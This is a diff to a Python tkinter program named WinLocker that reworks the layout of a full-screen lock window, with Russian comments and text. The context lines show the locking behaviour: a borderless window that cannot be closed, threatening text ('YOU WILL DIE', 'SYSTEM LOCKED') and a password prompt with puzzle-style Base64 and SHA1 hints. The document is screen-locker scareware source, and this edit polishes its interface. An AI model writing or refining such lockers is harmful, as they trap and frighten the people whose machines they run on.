@@ -61,11 +61,11 @@ class WinLocker:
         self.win.overrideredirect(True)
         self.win.protocol("WM_DELETE_WINDOW", lambda: None)
         
-        # Основной Canvas для графики
+        # Основной Canvas для графики (текст слева)
         self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
         self.canvas.pack(fill='both', expand=True)
         
-        # Центральные надписи
+        # Центральные надписи вверху
         self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='white', font=('Courier', 60, 'bold'), tags="title")
         self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='white', font=('Courier', 36))
         
@@ -85,18 +85,13 @@ class WinLocker:
             "4. Base64\nNDM1NjM0MjM0\n"
             "5. SHA1\nc93c407d0fb7c60a40b8a2f02b1e4ccf2a9c632d"
         )
-        # Размещаем текст в левом нижнем углу
         self.canvas.create_text(50, 550, text=scary_text, fill='white', font=('Courier', 14), anchor='sw')
         
-        # Отдельный Frame для поля ввода – строго по центру
-        center_frame = tk.Frame(self.win, bg='black')
-        center_frame.place(relx=0.5, rely=0.5, anchor='center')
-        
-        tk.Label(center_frame, text="ВВЕДИТЕ ПАРОЛЬ:", fg='white', bg='black', font=('Courier', 28)).pack(pady=10)
-        self.entry = tk.Entry(center_frame, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
-        self.entry.pack(pady=10)
-        self.status = tk.Label(center_frame, text="", fg='white', bg='black', font=('Courier', 20))
-        self.status.pack(pady=10)
+        # Поле ввода по центру (чуть ниже заголовков)
+        self.canvas.create_text(400, 250, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
+        self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
+        self.canvas.create_window(400, 310, window=self.entry)
+        self.status = self.canvas.create_text(400, 370, text="", fill='white', font=('Courier', 20))
         
         self.entry.bind('<Return>', self.check_password)
         self.entry.focus_set()
@@ -108,7 +103,7 @@ class WinLocker:
             self.root.destroy()
             os._exit(0)
         else:
-            self.status.config(text="НЕВЕРНЫЙ ПАРОЛЬ!")
+            self.canvas.itemconfig(self.status, text="НЕВЕРНЫЙ ПАРОЛЬ!")
             self.entry.delete(0, tk.END)
     
     def animate(self):
